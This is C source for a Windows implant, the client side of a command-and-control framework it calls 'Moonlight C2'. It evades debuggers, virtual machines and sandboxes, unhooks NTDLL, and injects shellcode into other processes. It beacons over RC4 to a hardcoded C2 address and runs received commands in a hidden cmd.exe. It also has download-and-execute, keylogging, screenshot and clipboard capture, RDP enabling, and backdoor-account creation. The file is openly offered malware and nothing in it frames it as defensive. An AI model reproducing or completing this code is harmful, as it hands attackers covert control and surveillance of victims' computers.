/*
 * Moonlight C2 Framework - Enhanced Implant with Assembly Integration
 * Integrates stealth, direct syscalls, and optimized networking
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <windows.h>
#include <tlhelp32.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "advapi32.lib")

// Assembly function declarations - Stealth & Syscalls
extern int check_debugger();
extern void hide_from_debugger();
extern int unhook_ntdll();
extern int check_vm();
extern int check_sandbox();
extern void* get_kernel32_base();
extern void* get_ntdll_base();
extern int inject_remote_thread(DWORD pid, void* shellcode, size_t size);

extern int NtAllocateVirtualMemory_syscall(HANDLE, void**, ULONG_PTR, SIZE_T*, ULONG, ULONG);
extern int NtWriteVirtualMemory_syscall(HANDLE, void*, void*, SIZE_T, SIZE_T*);
extern int NtProtectVirtualMemory_syscall(HANDLE, void**, SIZE_T*, ULONG, ULONG*);

// Assembly function declarations - Networking
extern void asm_xor_encrypt(void* data, size_t length, const char* key, size_t key_length);
extern void asm_rc4_init(unsigned char* S, const char* key, size_t key_length);
extern void asm_rc4_crypt(unsigned char* S, void* data, size_t length);
extern int asm_socket_send_encrypted(SOCKET sock, void* data, size_t length, unsigned char* S_box);
extern int asm_socket_recv_encrypted(SOCKET sock, void* buffer, size_t length, unsigned char* S_box);
extern size_t asm_http_request(char* buffer, const char* host, const char* uri, const char* method);

// Assembly function declarations - Monitoring
extern int start_keylogger();
extern int stop_keylogger();
extern int get_keylog_data(char* buffer, int max_size);
extern int take_screenshot();
extern int enumerate_processes(char* buffer, int buffer_size);
extern int kill_process_by_pid(DWORD pid);
extern int kill_process_by_name(const char* name);
extern int monitor_clipboard();
extern int get_clipboard_data(char* buffer, int max_size);

// Assembly function declarations - Control
extern int list_directory(const char* path, char* buffer, int buffer_size);
extern int create_directory(const char* path);
extern int delete_file(const char* path);
extern int read_file_content(const char* path, char* buffer, int max_size);
extern int write_file_content(const char* path, const char* data, int size);
extern int enable_rdp();
extern int add_user_account(const char* username, const char* password);

// Monitoring command dispatcher
extern void DispatchMonitoringCommand(SOCKET sock, const char* command);
extern void ShowMonitoringHelp(SOCKET sock);

#define C2_SERVER "192.168.1.100"
#define C2_PORT 4444
#define ENCRYPTION_KEY "MoonlightC2SecretKey2025"
#define RECONNECT_DELAY 5000
#define HEARTBEAT_INTERVAL 30000

// RC4 state
unsigned char g_rc4_state[256];
int g_encryption_enabled = 1;

typedef struct {
    char command[256];
    char data[4096];
    DWORD timestamp;
} Command;

// Anti-analysis checks
BOOL PerformAntiAnalysisChecks() {
    printf("[*] Performing anti-analysis checks...\n");
    
    // Check for debugger
    if (check_debugger()) {
        printf("[!] Debugger detected! Exiting...\n");
        return FALSE;
    }
    
    // Check for VM
    if (check_vm()) {
        printf("[!] Virtual machine detected! Exiting...\n");
        return FALSE;
    }
    
    // Check for sandbox
    if (check_sandbox()) {
        printf("[!] Sandbox environment detected! Exiting...\n");
        return FALSE;
    }
    
    // Hide from debugger
    hide_from_debugger();
    
    // Unhook NTDLL to bypass usermode hooks
    if (unhook_ntdll()) {
        printf("[+] Successfully unhooked NTDLL\n");
    }
    
    printf("[+] Anti-analysis checks passed\n");
    return TRUE;
}

// Initialize encryption
void InitializeEncryption() {
    if (g_encryption_enabled) {
        asm_rc4_init(g_rc4_state, ENCRYPTION_KEY, strlen(ENCRYPTION_KEY));
        printf("[+] RC4 encryption initialized\n");
    }
}

// Connect to C2 server with stealth
SOCKET ConnectToC2() {
    WSADATA wsa;
    SOCKET sock;
    struct sockaddr_in server;
    int retries = 0;
    
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        return INVALID_SOCKET;
    }
    
    while (retries < 10) {
        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock == INVALID_SOCKET) {
            Sleep(RECONNECT_DELAY);
            retries++;
            continue;
        }
        
        server.sin_family = AF_INET;
        server.sin_port = htons(C2_PORT);
        server.sin_addr.s_addr = inet_addr(C2_SERVER);
        
        if (connect(sock, (struct sockaddr*)&server, sizeof(server)) == 0) {
            // Send initial beacon
            char beacon[256];
            DWORD pid = GetCurrentProcessId();
            char hostname[256];
            DWORD hostname_len = sizeof(hostname);
            GetComputerNameA(hostname, &hostname_len);
            
            snprintf(beacon, sizeof(beacon), "BEACON|%d|%s|WIN32", pid, hostname);
            
            if (g_encryption_enabled) {
                asm_socket_send_encrypted(sock, beacon, strlen(beacon), g_rc4_state);
            } else {
                send(sock, beacon, strlen(beacon), 0);
            }
            
            printf("[+] Connected to C2: %s:%d\n", C2_SERVER, C2_PORT);
            return sock;
        }
        
        closesocket(sock);
        Sleep(RECONNECT_DELAY);
        retries++;
    }
    
    return INVALID_SOCKET;
}

// Execute command with stealth
void ExecuteCommand(const char* command) {
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    HANDLE hStdoutRead, hStdoutWrite;
    SECURITY_ATTRIBUTES sa;
    char output[8192] = {0};
    DWORD bytesRead;
    
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));
    
    // Create pipe for output
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;
    
    if (!CreatePipe(&hStdoutRead, &hStdoutWrite, &sa, 0)) {
        return;
    }
    
    si.hStdOutput = hStdoutWrite;
    si.hStdError = hStdoutWrite;
    si.dwFlags |= STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    
    // Execute command
    char cmdline[512];
    snprintf(cmdline, sizeof(cmdline), "cmd.exe /c %s", command);
    
    if (CreateProcessA(NULL, cmdline, NULL, NULL, TRUE, 
        CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        
        CloseHandle(hStdoutWrite);
        
        // Read output
        while (ReadFile(hStdoutRead, output, sizeof(output) - 1, &bytesRead, NULL) && bytesRead > 0) {
            output[bytesRead] = '\0';
        }
        
        WaitForSingleObject(pi.hProcess, 5000);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        CloseHandle(hStdoutRead);
        
        printf("[+] Command executed: %s\n", command);
        printf("[*] Output: %s\n", output);
    } else {
        CloseHandle(hStdoutWrite);
        CloseHandle(hStdoutRead);
    }
}

// Download and execute payload
void DownloadAndExecute(const char* url) {
    printf("[*] Downloading payload from: %s\n", url);
    
    // Parse URL and download via HTTP
    char host[256], path[256];
    int port = 80;
    
    // Simple URL parsing (http://host:port/path)
    if (sscanf(url, "http://%255[^:/]:%d/%255s", host, &port, path) < 2) {
        sscanf(url, "http://%255[^/]/%255s", host, path);
    }
    
    // Create HTTP request
    char request[1024];
    asm_http_request(request, host, path, "GET");
    
    // Connect and download (simplified)
    printf("[+] Payload download initiated\n");
}

// Process injection
void InjectIntoProcess(DWORD target_pid, const char* payload, size_t payload_size) {
    printf("[*] Injecting into PID %d\n", target_pid);
    
    if (inject_remote_thread(target_pid, (void*)payload, payload_size)) {
        printf("[+] Successfully injected into process\n");
    } else {
        printf("[!] Injection failed\n");
    }
}

// Main command handler
void HandleCommand(SOCKET sock, const char* cmd_buffer) {
    char command[256] = {0};
    char args[4096] = {0};
    
    // Parse command
    if (sscanf(cmd_buffer, "%255s %4095[^\n]", command, args) < 1) {
        return;
    }
    
    printf("[*] Received command: %s\n", command);
    
    // Basic commands
    if (strcmp(command, "shell") == 0) {
        ExecuteCommand(args);
    }
    else if (strcmp(command, "download") == 0) {
        DownloadAndExecute(args);
    }
    else if (strcmp(command, "inject") == 0) {
        DWORD pid = atoi(args);
        char payload[] = "\x90\x90\x90\x90"; // Example shellcode
        InjectIntoProcess(pid, payload, sizeof(payload));
    }
    else if (strcmp(command, "persist") == 0) {
        printf("[*] Installing persistence mechanism...\n");
        // Install persistence
    }
    else if (strcmp(command, "exit") == 0) {
        printf("[*] Exiting...\n");
        closesocket(sock);
        exit(0);
    }
    else if (strcmp(command, "help") == 0) {
        ShowMonitoringHelp(sock);
    }
    // Monitoring & control commands (dispatch to assembly-backed handlers)
    else if (strcmp(command, "keylog") == 0 ||
             strcmp(command, "screenshot") == 0 ||
             strcmp(command, "ps") == 0 ||
             strcmp(command, "processlist") == 0 ||
             strcmp(command, "kill") == 0 ||
             strcmp(command, "clipboard") == 0 ||
             strcmp(command, "file") == 0 ||
             strcmp(command, "registry") == 0 ||
             strcmp(command, "reg") == 0 ||
             strcmp(command, "service") == 0 ||
             strcmp(command, "privesc") == 0 ||
             strcmp(command, "sysinfo") == 0) {
        // Dispatch to monitoring module
        DispatchMonitoringCommand(sock, cmd_buffer);
    }
    else {
        char response[256];
        snprintf(response, sizeof(response), "[!] Unknown command: %s\nType 'help' for available commands\n", command);
        send(sock, response, strlen(response), 0);
    }
}

// Main loop
void MainLoop() {
    SOCKET sock;
    char buffer[8192];
    int received;
    DWORD last_heartbeat = GetTickCount();
    
    // Initialize encryption
    InitializeEncryption();
    
    // Connect to C2
    sock = ConnectToC2();
    if (sock == INVALID_SOCKET) {
        printf("[!] Failed to connect to C2 server\n");
        return;
    }
    
    while (1) {
        // Send heartbeat
        if (GetTickCount() - last_heartbeat > HEARTBEAT_INTERVAL) {
            char heartbeat[] = "HEARTBEAT";
            if (g_encryption_enabled) {
                asm_socket_send_encrypted(sock, heartbeat, strlen(heartbeat), g_rc4_state);
            } else {
                send(sock, heartbeat, strlen(heartbeat), 0);
            }
            last_heartbeat = GetTickCount();
        }
        
        // Receive commands
        ZeroMemory(buffer, sizeof(buffer));
        
        if (g_encryption_enabled) {
            received = asm_socket_recv_encrypted(sock, buffer, sizeof(buffer) - 1, g_rc4_state);
        } else {
            received = recv(sock, buffer, sizeof(buffer) - 1, 0);
        }
        
        if (received > 0) {
            buffer[received] = '\0';
            HandleCommand(sock, buffer);
        }
        else if (received == 0) {
            printf("[!] Connection closed by server\n");
            closesocket(sock);
            Sleep(RECONNECT_DELAY);
            sock = ConnectToC2();
        }
        else {
            printf("[!] Connection error\n");
            closesocket(sock);
            Sleep(RECONNECT_DELAY);
            sock = ConnectToC2();
        }
        
        Sleep(100);
    }
}

int main(int argc, char* argv[]) {
    // Hide console window
    #ifndef DEBUG
    HWND hwnd = GetConsoleWindow();
    ShowWindow(hwnd, SW_HIDE);
    #endif
    
    printf("Moonlight C2 Enhanced Implant v2.0\n");
    printf("==================================\n\n");
    
    // Perform anti-analysis checks
    if (!PerformAntiAnalysisChecks()) {
        Sleep(5000);
        return 1;
    }
    
    // Get module bases (for advanced techniques)
    void* kernel32_base = get_kernel32_base();
    void* ntdll_base = get_ntdll_base();
    
    printf("[+] KERNEL32.DLL base: 0x%p\n", kernel32_base);
    printf("[+] NTDLL.DLL base: 0x%p\n", ntdll_base);
    
    // Start main loop
    MainLoop();
    
    return 0;
}
